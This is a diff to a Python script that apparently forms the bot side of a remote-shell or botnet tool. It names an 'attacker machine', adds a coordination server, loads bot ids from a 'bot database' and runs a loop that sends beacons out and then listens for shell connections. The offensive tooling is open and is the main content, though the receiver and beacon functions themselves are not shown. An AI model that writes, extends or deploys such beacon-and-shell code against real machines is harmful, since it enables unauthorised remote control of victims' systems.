@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
 import os
+import sys
 import json
-import uuid
 import asyncio
 import argparse
 
@@ -20,12 +20,22 @@ def parse_args() -> argparse.Namespace:
 
     parser.add_argument("-addr",
                         type=str,
-                        help="the address to connect to (mandatory)")
+                        help="the address of the attacker machine (mandatory)")
 
-    parser.add_argument("-port",
+    parser.add_argument("-cord_addr",
+                        type=str,
+                        default='localhost',
+                        help="the address of the coordination server")
+
+    parser.add_argument("-cord_port",
                         type=int,
-                        default=1337,
-                        help="the port used for the connection")
+                        default=1338,
+                        help="the dest port used for coordination connection")
+
+    parser.add_argument("-localhost",
+                        type=bool,
+                        default=False,
+                        help="need to be set to true when using localhost connection (tested on windows)")
 
     parser.add_argument("-burst",
                         type=int,
@@ -56,36 +66,26 @@ def parse_args() -> argparse.Namespace:
 
 
 class ConnectionInfo:
+
     indent = 2
+    bot_database_path = "connection_data/database.json"
 
     def __init__(self, **kwargs):
-        self.id: str = self.__get_json_config(**kwargs)["id"]
+        config = self.__get_json_config(**kwargs)
         self.name: str = kwargs["name"]
-        self.addr: str = kwargs["addr"]
-        self.port: int = kwargs["port"]
+
+        self.id: str = config["id"]
+        self.addr: str = config["addr"]
+        self.local_port: int = config["local_port"]
 
     def __get_json_config(self, **kwargs):
-        if not os.path.isfile("connection_data/{}.json".format(kwargs["name"])):
-            return self.__generate_json_config(**kwargs)
+        if not os.path.isfile(self.bot_database_path):
+            print(f"{self.bot_database_path} not found!")
+            sys.exit(0)
 
-        with open("connection_data/{}.json".format(kwargs["name"]), mode="r") as json_file:
-            config = json.load(json_file)
+        with open(self.bot_database_path, mode="r") as json_file:
+            config = json.load(json_file)[kwargs["name"]]
             return config
-
-    @classmethod
-    def __generate_json_config(cls, **kwargs) -> dict:
-        config = {"name": kwargs["name"],
-                  "id": ConnectionInfo.__generate_random_id()
-                  }
-
-        with open("connection_data/{}.json".format(kwargs["name"]), mode="w") as json_file:
-            json.dump(config, json_file, indent=cls.indent)
-            return config
-
-    @staticmethod
-    def __generate_random_id() -> str:
-        unique_id = uuid.uuid4()
-        return unique_id.hex[:8]
 
 
 async def main_loop():
@@ -95,13 +95,14 @@ async def main_loop():
         print(e.message)
         return
 
-    connection_info = ConnectionInfo(**vars(args))
+    con_info = ConnectionInfo(**vars(args))
 
     # change to ipv4 "0.0.0.0". ipv4 doesn't work on localhost
-    receiver = ShellReceiver("::", args.port, args.timeout)
+    receiver = ShellReceiver(
+        "::" if args.localhost else "0.0.0.0", con_info.local_port, args.timeout)
 
     while True:
-        await transmit_beacon((args.addr, args.port), connection_info.id.encode(), args.burst, args.burst_timeout)
+        await transmit_beacon((args.cord_addr, args.cord_port), con_info.local_port, con_info.id.encode(), args.burst, args.burst_timeout)
         print("finished beacon")
         await receiver.listen()
         print("finished receiver")
